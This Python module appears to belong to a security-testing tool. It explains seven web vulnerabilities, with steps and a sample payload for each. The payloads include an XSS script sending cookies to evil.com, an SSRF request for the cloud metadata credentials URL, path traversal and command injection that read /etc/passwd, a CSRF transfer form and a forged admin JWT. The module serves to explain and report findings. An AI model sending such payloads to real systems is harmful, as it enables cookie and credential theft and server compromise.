"""Attack explainer — explains how each vulnerability works."""
# For authorized security testing only.
from typing import Dict


EXPLANATIONS = {
    "SQL Injection": {
        "what": "SQL Injection occurs when user-supplied input is incorporated into SQL queries without proper sanitization, allowing attackers to modify query logic.",
        "how": "The attacker injects SQL metacharacters (quotes, semicolons, comments) that break out of the intended query context and inject malicious SQL code.",
        "impact": "Authentication bypass, data exfiltration, data modification, denial of service, and in some cases remote code execution via stored procedures.",
        "example": "SELECT * FROM users WHERE username = '' OR '1'='1' -- ' AND password = 'x'",
        "steps": [
            "1. Attacker finds a parameter that's used in a SQL query",
            "2. Injects a single quote to break the query syntax",
            "3. Receives SQL error confirming injection point",
            "4. Crafts payload to bypass auth or extract data",
        ],
    },
    "XSS": {
        "what": "Cross-Site Scripting allows attackers to inject malicious client-side scripts into web pages viewed by other users.",
        "how": "User input is reflected in the HTML response without encoding, allowing JavaScript execution in other users' browsers.",
        "impact": "Session hijacking, credential theft, defacement, keylogging, CSRF attacks, and drive-by malware distribution.",
        "example": "<script>fetch('https://evil.com/?c='+document.cookie)</script>",
        "steps": [
            "1. Find input that is reflected in HTML output",
            "2. Inject script payload",
            "3. Script executes in victim's browser",
            "4. Attacker steals cookies/tokens or performs actions",
        ],
    },
    "SSRF": {
        "what": "Server-Side Request Forgery causes the server to make HTTP requests to arbitrary destinations, often bypassing firewalls.",
        "how": "A URL parameter controlled by the attacker is used by the server to make outgoing requests, reaching internal services.",
        "impact": "Access to internal services (AWS metadata, Kubernetes API, internal databases), port scanning, potential RCE.",
        "example": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "steps": [
            "1. Find a URL parameter used for server-side fetch",
            "2. Replace with internal IP or cloud metadata URL",
            "3. Server fetches internal resource",
            "4. Response leaked to attacker",
        ],
    },
    "LFI": {
        "what": "Local File Inclusion allows attackers to read arbitrary files from the server filesystem.",
        "how": "A file path parameter is manipulated with path traversal sequences (../) to navigate outside the intended directory.",
        "impact": "Source code disclosure, configuration file exposure (/etc/passwd), credential theft, log poisoning for RCE.",
        "example": "../../../../../../etc/passwd",
        "steps": [
            "1. Find a parameter that includes or loads a file",
            "2. Inject path traversal sequences",
            "3. Read sensitive files (/etc/passwd, config files)",
            "4. Escalate to RCE via log poisoning",
        ],
    },
    "CSRF": {
        "what": "Cross-Site Request Forgery tricks authenticated users into unknowingly submitting malicious requests.",
        "how": "An attacker crafts a form on a malicious page that submits to the target site. When the victim visits the page, their browser sends the request with their session cookies.",
        "impact": "Unauthorized account actions: password change, fund transfer, admin privilege escalation.",
        "example": '<form action="https://bank.com/transfer" method="POST"><input name="amount" value="1000"><input name="to" value="attacker"></form>',
        "steps": [
            "1. Attacker finds a state-changing POST endpoint",
            "2. Crafts HTML form on malicious site",
            "3. Victim visits attacker's page",
            "4. Form auto-submits with victim's credentials",
        ],
    },
    "Command Injection": {
        "what": "Command injection allows attackers to execute arbitrary OS commands on the server.",
        "how": "User input is passed to OS command execution functions (system(), exec(), popen()) without sanitization.",
        "impact": "Full server compromise, data exfiltration, lateral movement, persistence.",
        "example": "ping 127.0.0.1; cat /etc/passwd",
        "steps": [
            "1. Find parameter passed to OS command",
            "2. Inject command separators (; & | ||)",
            "3. Append malicious commands",
            "4. Receive command output or establish reverse shell",
        ],
    },
    "JWT Weak Secret": {
        "what": "JWT tokens signed with a weak or default secret can be forged by attackers.",
        "how": "An attacker brute-forces the HMAC secret used to sign JWTs. With the secret, they can forge tokens with any claims.",
        "impact": "Authentication bypass, privilege escalation, account takeover.",
        "example": 'eyJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4ifQ.{forged_signature}',
        "steps": [
            "1. Collect a valid JWT from the application",
            "2. Run offline brute-force against common secrets",
            "3. Forge a new JWT with elevated privileges",
            "4. Submit forged token to gain admin access",
        ],
    },
}


class AttackExplainer:
    def explain(self, finding: Dict) -> Dict:
        """Get explanation for a vulnerability finding."""
        vuln_type = finding.get("vuln_type", "")
        normalized = self._normalize(vuln_type)
        
        explanation = EXPLANATIONS.get(normalized, {
            "what": f"{vuln_type} is a security vulnerability that requires remediation.",
            "how": "This vulnerability allows attackers to compromise the application.",
            "impact": "Potential data breach or system compromise.",
            "example": "See OWASP documentation for examples.",
            "steps": ["Review OWASP guidelines for this vulnerability type"],
        })
        
        return explanation
    
    def _normalize(self, vuln_type: str) -> str:
        lower = vuln_type.lower()
        if "sql" in lower:
            return "SQL Injection"
        if "xss" in lower or "cross-site scripting" in lower:
            return "XSS"
        if "ssrf" in lower:
            return "SSRF"
        if "lfi" in lower or "path traversal" in lower:
            return "LFI"
        if "csrf" in lower:
            return "CSRF"
        if "command" in lower or "cmd" in lower:
            return "Command Injection"
        if "jwt" in lower:
            return "JWT Weak Secret"
        return vuln_type
